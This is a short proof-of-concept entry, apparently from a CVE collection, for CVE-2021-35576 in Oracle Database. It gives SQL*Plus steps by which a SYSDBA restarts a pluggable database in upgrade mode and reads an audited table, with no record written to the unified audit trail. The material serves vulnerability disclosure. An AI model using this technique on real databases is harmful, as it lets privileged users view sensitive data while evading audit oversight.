
### CVE
CVE-2021-35576

### 受影响版本
12.1.0.2, 12.2.0.1, 19c

### POC

```shell
Proof of Concept (PoC):
I will create a table in pluggable database PDB1 under HR schema and insert few records:
SQL> CREATE TABLE HR.EMPLOYEE
(
  FIRST_NAME  VARCHAR2(50),
  LAST_NAME   VARCHAR2(50)
);
SQL> INSERT INTO HR.EMPLOYEE (
   FIRST_NAME, LAST_NAME)
VALUES ( 'EMAD','MOUSA' );
SQL> commit;


SQL> INSERT INTO HR.EMPLOYEE (
   FIRST_NAME, LAST_NAME)
VALUES ( 'SAMI','MOUSA' );
SQL> commit;
I will now create audit policy:
SQL> CREATE AUDIT POLICY SELECT_P1 actions select on HR.EMPLOYEE;
SQL> audit policy SELECT_P1;
To check audit policies configured in PDB1 database:
SQL> SELECT * FROM audit_unified_enabled_policies;

Now, let us simulate executing the select statement against the monitored/audited table while database is in upgrade mode:
sqlplus / as sysdba
SQL> alter session set container=PDB1;
SQL> shutdown immediate;
SQL> startup upgrade;
SQL> select * from HR.EMPLOYEE;
SQL> startup force;
SQL> exec SYS.DBMS_AUDIT_MGMT.FLUSH_UNIFIED_AUDIT_TRAIL;


Checking the audit logs using the query, NO entry is found recorded in the unified audit trail:

SQL> select OS_USERNAME,USERHOST,DBUSERNAME,CLIENT_PROGRAM_NAME,EVENT_TIMESTAMP,ACTION_NAME,OBJECT_SCHEMA,OBJECT_NAME,SQL_TEXT from unified_audit_trail where OBJECT_NAME=’EMPLOYEE’ order by EVENT_TIMESTAMP desc;
So, even though audit policy was configured in the database a DBA/System Admin can view the audited sensitive table without a trace as No record will be populated in UNIFIED_AUDIT_TRAIL view !
```